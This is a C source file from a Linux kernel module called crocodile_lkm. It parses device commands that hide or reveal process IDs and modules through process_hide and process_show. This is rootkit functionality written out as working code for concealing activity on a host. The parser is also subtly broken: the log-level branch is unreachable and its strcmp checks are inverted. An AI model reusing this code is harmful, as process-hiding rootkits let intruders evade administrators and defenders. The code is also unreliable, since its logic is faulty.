/*
 * crocodile_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

//#include <linux/fs.h>
//#include <linux/kernel.h>
#include <linux/string.h>
//#include <linux/version.h>

#include "logging.h"
#include "device/details/hash_tbl.h"
#include "device/details/ioctl_cmd.h"
#include "proc/proc.h"

static int _check_cmd(char** p_cmd_str, size_t count)
{
    const int MAX_BUF_SIZE = 255;

    if ((count > MAX_BUF_SIZE - 1) || (count < 14)) {
        KLOG_DEBUG(LOG_PREFIX "_check_cmd: invalid buffer size %ld", count);
        return -EFAULT;
    }
    if (((*p_cmd_str)[3] != '_') || ((*p_cmd_str)[7] != '_')) {
        KLOG_DEBUG(LOG_PREFIX "_check_cmd: invalid buffer format");
        return -EFAULT;
    }
    (*p_cmd_str)[3] = (*p_cmd_str)[7] = 0;
    return 0;
}

static int _check_cmd_header(char** p_cmd_str)
{
    if (strcmp(*p_cmd_str, "IOC") != 0) {
        KLOG_DEBUG(LOG_PREFIX "_check_cmd_header: invalid header");
        return -EFAULT;
    }
    *p_cmd_str += 4;
    return 0;
}

static int _fill_cmd(char** p_cmd_str, unsigned int* p_cmd)
{
    if (strcmp(*p_cmd_str, "PID") == 0) {
        KLOG_DEBUG(LOG_PREFIX "_fill_cmd: processing pid");
        (*p_cmd_str)[12] = 0;
        *p_cmd = CROC_IOC_PID;
    } else if (strcmp(*p_cmd_str, "MOD") == 0) {
        KLOG_DEBUG(LOG_PREFIX "_fill_cmd: processing module");
        (*p_cmd_str)[12] = 0;
        *p_cmd = CROC_IOC_MOD;
    } else if (strcmp(*p_cmd_str, "LOG") == 0) {
        KLOG_DEBUG(LOG_PREFIX "_fill_cmd: processing log level");
        *p_cmd = CROC_IOC_LOG;
    } else {
        return -EFAULT;
    }

    *p_cmd_str += 4;
    if ((*p_cmd & CROC_IOC_PID) || (*p_cmd & CROC_IOC_LOG)) {
        if (strcmp(*p_cmd_str, "HIDE") == 0) {
            KLOG_DEBUG(LOG_PREFIX "_fill_cmd: hide pid");
            *p_cmd = *p_cmd | CROC_IOC_HIDE_CMD;
        } else if (strcmp(*p_cmd_str, "SHOW") == 0) {
            KLOG_DEBUG(LOG_PREFIX "_fill_cmd: show pid");
            *p_cmd = *p_cmd | CROC_IOC_SHOW_CMD;
        } else {
            return -EFAULT;
        }
    }
    if (*p_cmd & CROC_IOC_PID) {
        *p_cmd_str += 5;
    }
    return 0;
}

static int _fill_cmd_arg(char** p_cmd_str, unsigned int* p_cmd, unsigned long* p_arg)
{
    int rc = -EFAULT;

    if ((*p_cmd & CROC_IOC_PID) || (*p_cmd & CROC_IOC_LOG)) {
        rc = kstrtoul(*p_cmd_str, 10, p_arg);
    } else if (*p_cmd & CROC_IOC_LOG){
        if (strcmp(*p_cmd_str, "EMERG")) {
            *p_arg = LVL_EMERG;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "FATAL")) {
            *p_arg = LVL_FATAL;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "CRIT")) {
            *p_arg = LVL_CRIT;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "ERROR")) {
            *p_arg = LVL_ERROR;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "WARN")) {
            *p_arg = LVL_WARN;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "NOTICE")) {
            *p_arg = LVL_NOTICE;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "INFO")) {
            *p_arg = LVL_INFO;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "DEBUG")) {
            *p_arg = LVL_DEBUG;
            rc = 0;
        }
    }
    return rc;
}

int ioc_hide_pid(module_dev_t* p_dev, pid_t pid)
{
    int retval = 0;

    if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
        return -ESRCH;  /* No such process */
    }

    if (mutex_lock_interruptible(&p_dev->lock)) {
        return -ERESTARTSYS;
    }
    if (hash_tbl_insert(&p_dev->hash_tbl, pid) == 0) {
        retval = process_hide(pid);
        if (retval != 0) {
            hash_tbl_erase(&p_dev->hash_tbl, pid);
        }
    }
    mutex_unlock(&p_dev->lock);
    return retval;
}

int ioc_show_pid(module_dev_t* p_dev, pid_t pid)
{
    int retval = 0;

    if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
        return -ESRCH;  /* No such process */
    }

    if (mutex_lock_interruptible(&p_dev->lock)) {
        return -ERESTARTSYS;
    }
    if (hash_tbl_erase(&p_dev->hash_tbl, pid) == 0) {
        retval = process_show(pid);
    }
    mutex_unlock(&p_dev->lock);
    return retval;
}

int ioc_parse_cmd(char* p_cmd_str, size_t count, unsigned int* p_cmd, unsigned long* p_arg)
{
    int rc = 0;

    if ((p_cmd_str == NULL) || (p_cmd == NULL) || (p_arg == NULL)) {
        KLOG_DEBUG(LOG_PREFIX "ioc_parse_cmd: invalid input params");
        return -EFAULT;
    }

    rc = _check_cmd(&p_cmd_str, count);
    if (rc != 0) {
        KLOG_DEBUG(LOG_PREFIX "ioc_parse_cmd: failed to check command; reason: %d", rc);
        return rc;
    }
    rc = _check_cmd_header(&p_cmd_str);
    if (rc != 0) {
        KLOG_DEBUG(LOG_PREFIX "ioc_parse_cmd: invalid header; reason: %d", rc);
        return rc;
    }

    rc = _fill_cmd(&p_cmd_str, p_cmd);
    if (rc != 0) {
        KLOG_DEBUG(LOG_PREFIX "ioc_parse_cmd: invalid mode; reason: %d", rc);
        return rc;
    }

    rc = _fill_cmd_arg(&p_cmd_str, p_cmd, p_arg);
    return rc;
}

